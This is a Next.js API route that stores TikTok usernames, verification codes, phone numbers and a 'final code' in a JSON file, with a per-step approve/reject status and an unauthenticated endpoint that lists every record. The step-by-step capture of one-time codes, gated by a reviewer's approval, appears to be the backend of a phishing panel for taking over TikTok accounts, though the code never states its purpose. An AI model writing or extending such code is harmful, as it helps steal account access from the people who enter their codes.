
'use server';

import { NextResponse } from 'next/server';
import path from 'path';
import fs from 'fs/promises';
import type { Submission } from '@/lib/types';

const dataFilePath = path.join(process.cwd(), 'src/data/submissions.json');

async function readSubmissions(): Promise<Submission[]> {
  try {
    await fs.access(dataFilePath);
    const fileContents = await fs.readFile(dataFilePath, 'utf8');
    return JSON.parse(fileContents || '[]');
  } catch (error) {
    return [];
  }
}

async function writeSubmissions(data: Submission[]): Promise<void> {
  const dir = path.dirname(dataFilePath);
  try {
    await fs.access(dir);
  } catch {
    await fs.mkdir(dir, { recursive: true });
  }
  await fs.writeFile(dataFilePath, JSON.stringify(data, null, 2));
}

export async function GET(request: Request) {
    const { searchParams } = new URL(request.url);
    const userId = searchParams.get('id');
    
    try {
        const submissions = await readSubmissions();
        if (userId) {
            const submission = submissions.find(s => s.id === userId);
            if (!submission) {
                return NextResponse.json({ message: 'Submission not found' }, { status: 404 });
            }
            return NextResponse.json(submission);
        } else {
            return NextResponse.json(submissions.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()));
        }
    } catch (error: any) {
        console.error('Error fetching submissions:', error);
        return NextResponse.json({ message: error.message || "Could not fetch submissions." }, { status: 500 });
    }
}


export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { id, step, data, status, login } = body;

    let submissions = await readSubmissions();
    
    if (login) {
        if (!id) {
            return NextResponse.json({ message: 'TikTok username is required.' }, { status: 400 });
        }
        let submission = submissions.find(s => s.id === id);

        if (submission) {
            return NextResponse.json(submission);
        } else {
            const newSubmission: Submission = {
                id,
                createdAt: new Date().toISOString(),
                isVerified: false,
                tiktokUsername: id,
                tiktokUsernameStatus: 'approved',
                verificationCode: '',
                verificationCodeStatus: 'pending',
                phoneNumber: '',
                phoneNumberStatus: 'pending',
                finalCode: '',
                finalCodeStatus: 'pending',
            };
            submissions.push(newSubmission);
            await writeSubmissions(submissions);
            return NextResponse.json(newSubmission, { status: 200 });
        }
    }


    if (!id || !step) {
      return NextResponse.json({ message: 'Submission ID and step are required' }, { status: 400 });
    }

    const submissionIndex = submissions.findIndex(s => s.id === id);

    if (submissionIndex === -1) {
        return NextResponse.json({ message: 'Submission not found.' }, { status: 404 });
    }
    
    const submission = submissions[submissionIndex];
        
    if (data !== undefined) {
        (submission as any)[step] = data;
        // Reset rejection reason on new data submission
        submission.rejectionReason = undefined;
    }

    const statusKey = `${step}Status` as keyof Submission;
    if (status) {
        (submission as any)[statusKey] = status;
        if(status === 'rejected') {
            submission.rejectionReason = body.rejectionReason || `The value for ${step} was not approved.`;
        }
    } else {
         (submission as any)[statusKey] = 'pending';
    }
        
    submissions[submissionIndex] = submission;

    await writeSubmissions(submissions);

    return NextResponse.json(submission, { status: 200 });

  } catch (error: any) {
    console.error("Error processing submission:", error);
    return NextResponse.json({ message: error.message || 'Error processing request' }, { status: 500 });
  }
}
